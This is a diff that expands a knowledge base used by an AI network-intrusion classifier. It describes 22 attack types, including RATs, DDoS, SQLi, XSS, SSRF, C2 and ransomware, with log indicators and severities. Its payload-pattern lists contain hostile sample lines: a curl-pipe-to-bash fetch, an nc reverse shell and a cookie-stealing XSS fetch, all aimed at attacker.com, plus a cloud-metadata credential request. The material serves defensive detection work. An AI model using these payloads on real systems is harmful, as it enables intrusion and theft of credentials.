@@ -1,272 +1,617 @@
-KNOWLEDGE_BASE: CYBER ATTACK DETECTION
+================================================================================
+KNOWLEDGE BASE — CYBER ATTACK DETECTION (IDS-AI)
+================================================================================
+PURPOSE: This knowledge base is used by an AI classifier to analyze network
+traffic logs and determine whether a connection is Normal, Suspicious, or
+Malicious. Each entry describes an attack type with its network-level
+indicators so the AI can match observed traffic patterns to known threats.
 
-========================================
+LOG FORMAT REFERENCE:
+  src=<IP>:<port>  dst=<IP>:<port>  proto=<tcp|udp|icmp>  service=<name>
+  conn_state=<state>  duration=<s>  src_bytes=<n>  dst_bytes=<n>
+  missed=<n>  src_pkts=<n>  dst_pkts=<n>  http_status=<code>
 
-1. SQL INJECTION (SQLi)
-   ========================================
-   Description:
-   Injection of malicious SQL queries through user input fields.
+CONNECTION STATE CODES:
+  SF  = Normal full connection (SYN+data+FIN)
+  S0  = SYN sent, no reply (likely scan or filtered)
+  REJ = Connection rejected by destination
+  RSTO/RSTR = Reset by originator/responder
+  OTH = Partial/unknown connection
 
-Characteristics:
+SEVERITY SCALE: LOW | MEDIUM | HIGH | CRITICAL
+================================================================================
 
-* Inputs containing ' OR 1=1 --
-* Use of UNION SELECT statements
-* Direct database access attempts
 
-Patterns:
-
-* ' OR '1'='1
-* UNION SELECT
-* DROP TABLE
-* -- (SQL comment)
-
-Indicators:
-
-* Visible SQL errors
-* Unauthorized data access
-* Unusual or complex queries
-
-========================================
-2. CROSS-SITE SCRIPTING (XSS)
-=============================
-
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ 1. BACKDOOR / REMOTE ACCESS TROJAN (RAT)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Description:
-Injection of malicious client-side scripts.
+  A backdoor is a covert communication channel installed on a compromised host
+  that allows an attacker to execute commands, transfer files, or maintain
+  persistent access without the victim's knowledge. RATs (Remote Access Trojans)
+  are a specific category with full interactive control.
 
-Characteristics:
+Network Indicators:
+  - Non-standard or high destination ports (4444, 1337, 31337, 5555, 6666, 8888,
+    9999, 12345, 6667, 1234)
+  - Long-duration connections (duration > 30s) with low data volume (idle channel)
+  - Small periodic packets at regular intervals (heartbeat/keep-alive)
+  - Bidirectional traffic: src_bytes > 0 AND dst_bytes > 0 (interactive session)
+  - Unusual protocol/service mismatch (e.g., HTTP traffic on non-port-80)
+  - Connections to internal IPs from external sources on unusual ports
+  - conn_state = SF with long duration and low byte count
 
-* JavaScript embedded in user input
-* Executed in victim's browser
+Behavioral Patterns:
+  - Persistent connection maintained over long periods
+  - Commands sent in small bursts (src_bytes small), large responses (dst_bytes high)
+  - Unusual times of connection (off-hours activity)
+  - Encrypted or binary traffic on plaintext service ports
 
-Patterns:
+Severity: CRITICAL
+Common Ports: 4444, 1337, 31337, 5555, 6666, 8888, 12345, 6667
 
-* <script>alert(1)</script>
-* javascript:
-* onerror= / onload=
 
-Indicators:
-
-* Unexpected popups
-* Redirects
-* Cookie/session theft
-
-========================================
-3. CROSS-SITE REQUEST FORGERY (CSRF)
-====================================
-
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ 2. DISTRIBUTED DENIAL OF SERVICE (DDoS)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Description:
-Unauthorized actions triggered via forged requests.
+  A coordinated flood attack from multiple sources designed to exhaust target
+  resources (bandwidth, CPU, memory, connections). DDoS differs from DoS by
+  using a distributed botnet, making it harder to block by IP.
 
-Characteristics:
+Network Indicators:
+  - Very high src_pkts or dst_pkts (thousands per second)
+  - Very high src_bytes with near-zero dst_bytes (one-directional flood)
+  - Many connections from different IPs to the same destination
+  - Short duration + very high packet count (volumetric attack)
+  - Amplification attacks: small src_bytes, very large dst_bytes (ratio > 50x)
+    — common with DNS (port 53), NTP (port 123), SSDP (port 1900)
+  - UDP flood: proto=udp, large src_bytes, short duration, no response
+  - SYN flood: conn_state=S0 (SYN with no reply), very high count, small bytes
 
-* Requests sent from authenticated user sessions
-* Missing CSRF protection tokens
+Attack Sub-types:
+  - Volumetric: overwhelm bandwidth (UDP/ICMP flood)
+  - Protocol: exhaust connection tables (SYN flood, ping of death)
+  - Application: target L7 (HTTP GET flood, Slowloris)
+  - Amplification: leverage open resolvers (DNS, NTP, memcached amplification)
 
-Patterns:
+Severity: CRITICAL
+Typical Ratio: src_bytes >> dst_bytes OR dst_bytes >> src_bytes (amplification)
 
-* POST requests without CSRF token
-* Sensitive actions without validation
 
-Indicators:
-
-* Actions not initiated by user
-* Suspicious account changes
-
-========================================
-4. COMMAND INJECTION
-====================
-
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ 3. DENIAL OF SERVICE (DoS)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Description:
-Execution of system commands via user input.
+  A single-source attack aimed at crashing or degrading a service by sending
+  more traffic than the target can handle. Unlike DDoS, it originates from
+  one IP address.
 
-Characteristics:
+Network Indicators:
+  - Extremely high src_bytes or src_pkts from a single source IP
+  - Very short duration connections with massive data volumes
+  - Repeated identical connections to the same dst_port
+  - conn_state=S0 (half-open) or REJ in large volume (resource exhaustion)
+  - proto=icmp with large src_bytes (ICMP flood / ping of death)
+  - Near-zero dst_bytes (server too busy to respond)
+  - Slowloris pattern: long duration, tiny src_bytes, many connections
 
-* Use of shell operators ; && |
-* System-level command execution
+Severity: HIGH
 
-Patterns:
 
-* ; ls
-* && cat /etc/passwd
-* | whoami
-
-Indicators:
-
-* Unexpected system responses
-* Access to sensitive files
-
-========================================
-5. DIRECTORY TRAVERSAL
-======================
-
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ 4. PORT SCANNING / NETWORK RECONNAISSANCE
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Description:
-Accessing files outside the intended directory.
+  Systematic probing of a target host to discover open ports and running
+  services. Used as a precursor to a targeted attack. Common tools: Nmap,
+  Masscan, Zmap.
 
-Characteristics:
+Network Indicators:
+  - Many connections from same src_ip to different dst_ports in rapid succession
+  - Very short duration (duration ≈ 0) per connection
+  - Minimal src_bytes and dst_bytes (just probe packets)
+  - conn_state=S0 (no response), REJ, or RSTO in large numbers
+  - src_pkts=1, dst_pkts=0 per connection (SYN-only scan)
+  - Sequential or randomized port coverage across common ranges
+  - proto=tcp SYN scan OR proto=udp for UDP scan
 
-* Use of ../ sequences
+Scan Types:
+  - SYN scan (stealth): conn_state=S0, no full handshake
+  - Connect scan: conn_state=SF, full handshake on open ports
+  - UDP scan: short connections, many REJ responses
+  - XMAS/FIN scan: unusual TCP flags, no SYN
 
-Patterns:
+Severity: MEDIUM (reconnaissance phase — often precedes a real attack)
 
-* ../../etc/passwd
-* ..\..\windows\system32
 
-Indicators:
-
-* Access to system files
-* Path-related errors
-
-========================================
-6. DENIAL OF SERVICE (DoS/DDoS)
-===============================
-
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ 5. SQL INJECTION (SQLi)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Description:
-Overloading a system to disrupt availability.
+  Insertion of malicious SQL statements into input fields that are passed
+  directly to a database query. Can result in unauthorized data access, data
+  deletion, or full database takeover.
 
-Characteristics:
+Network Indicators:
+  - dst_port=80 or 443 (HTTP/HTTPS), service=http or ssl
+  - http_request_body_len > 0 with special character patterns in payload
+  - Abnormally large HTTP request body (http_request_body_len >> normal)
+  - http_status_code=500 (server error from malformed query)
+  - http_status_code=200 with unusually large response (data dump)
+  - Multiple rapid requests with varied payloads to the same endpoint
+  - Short duration with disproportionately large responses
 
-* High volume of requests
-* Abnormal traffic patterns
+Payload Patterns (in raw_log or HTTP body):
+  - ' OR '1'='1  |  ' OR 1=1 --  |  1; DROP TABLE
+  - UNION SELECT  |  UNION ALL SELECT
+  - AND SLEEP()  |  AND BENCHMARK()  (time-based blind SQLi)
+  - Information schema queries: SELECT * FROM information_schema.tables
+  - Hex/base64 encoded payloads to evade WAF
 
-Patterns:
+Severity: HIGH
 
-* Repeated massive requests
 
-Indicators:
-
-* Increased latency
-* Service downtime
-
-========================================
-7. BRUTE FORCE ATTACK
-=====================
-
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ 6. COMMAND INJECTION / OS INJECTION
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Description:
-Repeated login attempts to guess credentials.
+  Injection of operating system commands through vulnerable application inputs
+  that are passed to a shell without sanitization. Allows full system
+  compromise if the application runs with elevated privileges.
 
-Characteristics:
+Network Indicators:
+  - HTTP requests with shell metacharacters in parameters
+  - Unusual response sizes indicating command output in HTTP body
+  - http_status_code=200 with unusually large response (command output)
+  - Requests to CGI scripts or endpoints that invoke system commands
+  - Outbound connections from web server to unknown IPs (reverse shell)
+  - Subsequent backdoor connections after initial injection
 
-* Multiple authentication attempts
-* Password variations
+Payload Patterns:
+  - ; ls -la  |  && cat /etc/passwd  |  | whoami
+  - $(command)  |  `command`  (command substitution)
+  - ; curl http://attacker.com/shell.sh | bash
+  - nc -e /bin/sh attacker.com 4444  (reverse shell)
+  - Encoded variants: %3B, %26%26, %7C
 
-Patterns:
+Severity: CRITICAL
 
-* login=admin&password=...
-* Rapid repeated attempts
 
-Indicators:
-
-* Multiple failed logins
-* Repeated IP usage
-
-========================================
-8. FILE INCLUSION (LFI/RFI)
-===========================
-
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ 7. BRUTE FORCE / CREDENTIAL STUFFING / PASSWORD SPRAYING
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Description:
-Including local or remote files into execution.
+  Automated attempts to gain unauthorized access by systematically trying
+  passwords or credentials. Brute force tries all combinations; credential
+  stuffing uses known leaked credentials; password spraying tries one common
+  password across many accounts to avoid lockouts.
 
-Characteristics:
+Network Indicators:
+  - High number of connections from same src_ip to same dst_ip:dst_port
+  - Short duration per connection with small src_bytes and dst_bytes
+  - Repeated authentication failures (http_status_code=401 or 403)
+  - Targeted ports: 22 (SSH), 21 (FTP), 23 (Telnet), 3389 (RDP),
+    5900 (VNC), 25 (SMTP), 80/443 (web login), 3306 (MySQL)
+  - conn_state=SF with immediate disconnect (fast fail)
+  - High src_pkts relative to session duration (rapid-fire attempts)
+  - Credential stuffing: requests from many different IPs to same endpoint
 
-* Manipulated file parameters
+Password Spraying Pattern:
+  - Low frequency per account (1-2 attempts) to evade lockout
+  - Same password tried across many different dst_ips or accounts
+  - Slower rate than brute force (evades rate limiting)
 
-Patterns:
+Severity: HIGH
+Common Target Ports: 22, 21, 23, 3389, 5900, 25, 80, 443, 3306
 
-* file=../../etc/passwd
-* http://malicious.com/shell.txt
 
-Indicators:
-
-* Execution of external code
-* Reading sensitive files
-
-========================================
-9. XML EXTERNAL ENTITY (XXE)
-============================
-
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ 8. CROSS-SITE SCRIPTING (XSS)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Description:
-Exploiting XML parsers via external entities.
+  Injection of malicious JavaScript or HTML into web pages viewed by other
+  users. The malicious script executes in the victim's browser, allowing
+  session hijacking, credential theft, or defacement.
 
-Characteristics:
+Network Indicators:
+  - dst_port=80 or 443, service=http
+  - HTTP GET/POST with script tags or event handlers in parameters
+  - Large http_response_body_len (server reflecting injected content)
+  - Requests containing encoded script payloads (%3Cscript%3E)
 
-* Malicious XML payloads
+Payload Patterns:
+  - <script>alert(document.cookie)</script>
+  - <img src=x onerror=fetch('http://attacker.com/?c='+document.cookie)>
+  - javascript:eval(...)
+  - <svg onload=...>  |  <body onpageshow=...>
+  - DOM-based: #<script>...  (hash-based injection)
 
-Patterns:
+XSS Types:
+  - Reflected: payload in URL/request, executed immediately
+  - Stored: payload saved in database, executed for all visitors
+  - DOM-based: client-side JavaScript manipulates the DOM
 
-* <!ENTITY xxe SYSTEM "file:///etc/passwd">
+Severity: MEDIUM to HIGH (depends on application privileges)
 
-Indicators:
 
-* Internal file disclosure
-* Internal network access
-
-========================================
-10. SERVER-SIDE REQUEST FORGERY (SSRF)
-======================================
-
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+ 9. CROSS-SITE REQUEST FORGERY (CSRF)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Description:
-Server making unauthorized internal requests.
+  Tricks an authenticated user into unknowingly submitting a forged request
+  to a web application. The server processes it as a legitimate request
+  because it carries the user's valid session cookies.
 
-Characteristics:
+Network Indicators:
+  - POST requests to sensitive endpoints without CSRF token in body/header
+  - Unusual Referer header (request originating from a third-party domain)
+  - State-changing requests (password change, money transfer) with no user action
+  - http_request_body_len small (simple form submission)
 
-* Manipulated URLs
+Payload Patterns:
+  - POST /transfer amount=1000&to=attacker (no CSRF token)
+  - <form action="https://victim.com/change-email" method="POST">
+  - Missing X-CSRF-Token or _csrf headers on sensitive endpoints
 
-Patterns:
+Severity: MEDIUM
 
-* http://127.0.0.1
-* http://internal-service
 
-Indicators:
-
-* Access to internal services
-* Internal network scanning
-
-========================================
-11. PRIVILEGE ESCALATION
-========================
-
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+10. DIRECTORY TRAVERSAL / PATH TRAVERSAL
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Description:
-Gaining higher access rights than allowed.
+  Manipulation of file path parameters to access files and directories outside
+  the web root. Can expose configuration files, private keys, and system files.
 
-Characteristics:
+Network Indicators:
+  - HTTP requests with ../ sequences in URL or parameters
+  - Requests targeting known sensitive system paths
+  - http_status_code=200 with large response (file contents returned)
+  - http_status_code=403/404 with small response (access denied or not found)
+  - Encoded traversal sequences in URL
 
-* Unauthorized admin actions
+Payload Patterns:
+  - ../../etc/passwd  |  ../../../etc/shadow
+  - ..\..\windows\system32\config\SAM  (Windows)
+  - Encoded: %2e%2e%2f  |  %252e%252e%252f  (double URL encoding)
+  - Null byte: ../../../etc/passwd%00  (bypass extension check)
+  - Target files: /etc/passwd, /etc/hosts, /proc/self/environ, web.config
 
-Indicators:
+Severity: HIGH
 
-* Role changes without permission
-* Access to restricted features
 
-========================================
-12. MALWARE / PAYLOAD OBFUSCATION
-=================================
-
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+11. FILE INCLUSION (LFI / RFI)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Description:
-Hidden or obfuscated malicious code.
+  Local File Inclusion (LFI) forces the application to include a local file
+  in its output. Remote File Inclusion (RFI) loads and executes a file from
+  an external server, enabling full remote code execution.
 
-Characteristics:
+Network Indicators:
+  - File parameters pointing to absolute paths or remote URLs
+  - RFI: outbound HTTP request from the server after initial request
+  - Large http_response_body_len (file contents included in response)
+  - http_status_code=500 on failed inclusion attempts
+  - Connections to unknown external IPs from the server (RFI execution)
 
-* Base64 encoding
-* JavaScript obfuscation
+Payload Patterns:
+  - LFI: ?page=../../etc/passwd  |  ?file=/var/log/apache2/access.log
+  - RFI: ?page=http://attacker.com/shell.php
+  - Log poisoning (LFI+exec): include server logs containing injected PHP
+  - PHP wrappers: php://filter/convert.base64-encode/resource=/etc/passwd
 
-Patterns:
+Severity: CRITICAL (RFI) / HIGH (LFI)
 
-* eval(atob())
-* Encoded payloads
 
-Indicators:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+12. SERVER-SIDE REQUEST FORGERY (SSRF)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Description:
+  Forces the server to make outbound requests to internal or external resources
+  chosen by the attacker. Can access internal services, cloud metadata APIs,
+  or bypass firewalls.
 
-* Unreadable code
-* Dynamic execution behavior
+Network Indicators:
+  - Requests from server to 127.0.0.1 / localhost / 169.254.x.x (cloud metadata)
+  - HTTP requests to internal IP ranges: 10.x.x.x, 172.16-31.x.x, 192.168.x.x
+  - Unusual outbound connections from application server to internal hosts
+  - Connections to AWS metadata: 169.254.169.254, GCP: 169.254.169.254/metadata
 
-========================================
-GLOBAL DETECTION RULES
-======================
+Payload Patterns:
+  - ?url=http://127.0.0.1:6379  (Redis internal service)
+  - ?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+  - ?url=file:///etc/passwd
+  - Bypass techniques: http://2130706433 (decimal IP), http://0177.0.0.01 (octal)
 
-* Inputs with suspicious special characters
-* Abnormal input length
-* High repetition patterns
-* Unusual encoding (hex, base64)
-* Mismatch between expected input type and actual content
+Severity: HIGH to CRITICAL
 
-END_OF_KNOWLEDGE_BASE
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+13. XML EXTERNAL ENTITY INJECTION (XXE)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Description:
+  Exploitation of XML parsers that process external entity references. Allows
+  reading local files, performing SSRF, or causing denial of service through
+  "Billion Laughs" entity expansion attacks.
+
+Network Indicators:
+  - HTTP POST with Content-Type: application/xml or text/xml
+  - http_request_body_len > 0 with DOCTYPE or ENTITY declarations
+  - http_response_body_len unusually large (file contents in response)
+  - Subsequent unexpected outbound connections from server (SSRF via XXE)
+
+Payload Patterns:
+  - <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+  - <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/data">]>
+  - Billion Laughs (DoS): nested entity expansion (lol1...lol9)
+  - Blind XXE: out-of-band data exfiltration via DNS/HTTP
+
+Severity: HIGH
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+14. PRIVILEGE ESCALATION
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Description:
+  Gaining higher access rights than originally granted. Horizontal escalation
+  targets other users' resources; vertical escalation gains administrator or
+  root privileges.
+
+Network Indicators:
+  - Access to admin endpoints (/admin, /root, /sudo, /superuser) by non-admin IPs
+  - Sudden access to resources previously returning 403 after a period of 401s
+  - API calls that modify roles, permissions, or group memberships
+  - Access to internal management ports (8080, 8443, 9090, 4848) from external IPs
+  - Unusual privilege-related queries or admin API calls in HTTP traffic
+
+Behavioral Patterns:
+  - Exploit of SUID binaries, sudo misconfigurations, kernel vulnerabilities
+  - Token manipulation: JWT with modified claims (role:admin)
+  - IDOR (Insecure Direct Object Reference): changing user ID in requests
+
+Severity: CRITICAL
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+15. MALWARE / PAYLOAD OBFUSCATION
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Description:
+  Techniques used to hide or disguise malicious payloads from security tools.
+  Obfuscated code is harder to detect by signature-based systems.
+
+Network Indicators:
+  - Unusually high ratio of entropy in HTTP body (encrypted/encoded payload)
+  - Base64 or hex-encoded content in HTTP parameters or body
+  - Binary or non-printable data in HTTP GET parameters
+  - Known obfuscation patterns in http_request_body or URL
+
+Payload Patterns:
+  - eval(atob('base64string'))  (JavaScript)
+  - \x68\x65\x6c\x6c\x6f  (hex-encoded)
+  - PowerShell: -EncodedCommand, -Enc (base64 command)
+  - Python: exec(compile(__import__('base64').b64decode(...)))
+  - Polyglot payloads that are valid in multiple contexts (HTML+JS+SQL)
+
+Severity: HIGH
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+16. MAN-IN-THE-MIDDLE (MITM) / ARP SPOOFING / DNS SPOOFING
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Description:
+  The attacker positions themselves between two communicating parties to
+  intercept, read, or modify traffic. ARP spoofing redirects LAN traffic;
+  DNS spoofing redirects domain resolutions to malicious IPs.
+
+Network Indicators:
+  - ARP Spoofing: unusual ARP replies mapping multiple IPs to same MAC
+  - DNS Spoofing: DNS responses from unexpected source IPs (not the real resolver)
+  - SSL/TLS certificate warnings (wrong cert for domain — MITM proxy)
+  - Unexpected intermediate hops in traceroute
+  - Traffic to internal gateway redirected to unknown IP
+  - DNS queries answered too quickly (local cache poisoning)
+  - SSL stripping: HTTPS downgraded to HTTP (port 443 → port 80 redirect)
+
+Network Patterns:
+  - proto=udp, dst_port=53, dst_bytes >> src_bytes (amplified DNS response)
+  - Multiple DNS responses for same query from different src_ips
+  - HTTP traffic on port 443 (SSL stripping indicator)
+
+Severity: HIGH to CRITICAL
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+17. COMMAND AND CONTROL (C2) COMMUNICATION
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Description:
+  Communication channel between malware on a compromised host and the
+  attacker's server (C2/C&C). Used to receive instructions, exfiltrate data,
+  and coordinate botnets. Often disguised as legitimate traffic.
+
+Network Indicators:
+  - Periodic beaconing: regular short connections at fixed intervals to same IP
+  - Unusual outbound connections to external IPs on non-standard ports
+  - HTTP/HTTPS traffic with unusually uniform request intervals (jitter)
+  - DNS-based C2: high frequency of DNS queries for unusual subdomains
+  - Low and slow traffic: small regular packets to maintain channel
+  - Domain Generation Algorithm (DGA): connections to random-looking domains
+  - Long TCP sessions with minimal but periodic data exchange
+  - IRC-based C2: connections to port 6667 (IRC) from workstations
+
+Behavioral Patterns:
+  - src_bytes small, dst_bytes small, duration very long
+  - conn_state=SF with very low bytes per second
+  - Beaconing interval: exactly 60s, 300s, 3600s (too regular = suspicious)
+
+Severity: CRITICAL
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+18. DATA EXFILTRATION
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Description:
+  Unauthorized transfer of sensitive data from a compromised system to an
+  external location controlled by the attacker. Often the final step in
+  a data breach.
+
+Network Indicators:
+  - Large outbound src_bytes to external IP (high data volume exiting network)
+  - dst_bytes << src_bytes ratio (sending much more than receiving)
+  - Data transferred over unusual protocols: ICMP, DNS tunneling, SMTP
+  - Outbound traffic at unusual hours to new/unknown destinations
+  - DNS tunneling: very long DNS query names (> 50 chars), proto=udp port=53
+  - Connections to cloud storage, pastebin, or file-sharing services from servers
+  - Incremental transfers: many medium-sized connections over time to same IP
+
+Covert Channels:
+  - DNS tunneling: data encoded in DNS queries (high src_bytes for DNS)
+  - ICMP tunneling: data in ICMP payload (proto=icmp with large src_bytes)
+  - HTTPS exfiltration: blends with normal HTTPS traffic (hard to detect)
+  - Steganography in image uploads (large http_request_body_len)
+
+Severity: CRITICAL
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+19. LATERAL MOVEMENT
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Description:
+  After gaining initial access, the attacker moves through the network to
+  reach higher-value targets. Uses stolen credentials, exploits, or legitimate
+  admin tools to access additional systems.
+
+Network Indicators:
+  - Internal-to-internal connections on admin ports from unexpected sources
+  - SMB traffic (port 445) or RDP (port 3389) from workstation to workstation
+  - Pass-the-Hash / Pass-the-Ticket: authentication without password (Kerberos)
+  - WMI remote execution: connections on port 135 (DCOM/WMI)
+  - SSH connections between internal hosts that don't normally communicate
+  - PowerShell remoting: WinRM port 5985/5986 from unexpected host
+  - Service accounts connecting to many internal hosts in sequence
+
+Common Tools Signatures:
+  - PsExec: SMB + IPC$ share access + service creation (port 445)
+  - Mimikatz: LSASS memory access (detectable via endpoint logs)
+  - BloodHound: LDAP queries to domain controller (port 389/636)
+  - Cobalt Strike: beaconing on port 80/443 with specific HTTP patterns
+
+Severity: CRITICAL
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+20. RANSOMWARE
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Description:
+  Malware that encrypts victim's files and demands ransom payment for
+  decryption. Modern ransomware (double extortion) also exfiltrates data
+  before encryption.
+
+Network Indicators:
+  - Large outbound transfers before encryption phase (exfiltration)
+  - Connections to Tor network (port 9001, 9030) or onion services
+  - C2 check-in to retrieve encryption key (small request, small response)
+  - SMB scanning internally (port 445) for network shares to encrypt
+  - DNS queries to known ransomware C2 domains
+  - Sudden spike in file system activity (not directly visible in network logs
+    but correlated with unusual SMB traffic)
+
+Behavioral Phases:
+  1. Initial access (phishing, exploit)
+  2. Persistence + reconnaissance
+  3. Lateral movement (SMB, RDP)
+  4. Exfiltration (large outbound transfer)
+  5. C2 key exchange (small connection)
+  6. Encryption + ransom note
+
+Severity: CRITICAL
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+21. CRYPTOJACKING
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Description:
+  Unauthorized use of a victim's computing resources to mine cryptocurrency.
+  Can run in browser (JavaScript) or as a background process after compromise.
+
+Network Indicators:
+  - Persistent connections to mining pool servers (ports 3333, 4444, 8888, 14444)
+  - Stratum protocol: connection to pool.*.com or *.minexmr.com
+  - High and sustained outbound traffic (steady stream of mining shares)
+  - Connections from many hosts to the same mining pool IP
+  - Long duration connections with periodic low-volume data exchange
+  - proto=tcp, dst_port=3333 or 4444, long duration, regular data intervals
+
+Common Mining Pools:
+  - XMRig (Monero): pool.supportxmr.com, minexmr.com (port 4444)
+  - Nicehash: stratum+tcp://*.nicehash.com (port 3353)
+
+Severity: MEDIUM
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+22. ARP / VLAN HOPPING / NETWORK SPOOFING
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Description:
+  Low-level network attacks that manipulate Layer 2 protocols to intercept
+  or redirect traffic. ARP spoofing maps attacker's MAC to target IP; VLAN
+  hopping bypasses network segmentation.
+
+Network Indicators:
+  - Gratuitous ARP replies not triggered by requests
+  - Same MAC address responding for multiple IPs
+  - 802.1Q double-tagged frames (VLAN hopping)
+  - Traffic appearing from unexpected VLANs or subnets
+  - High volume of ARP traffic from a single MAC/IP
+
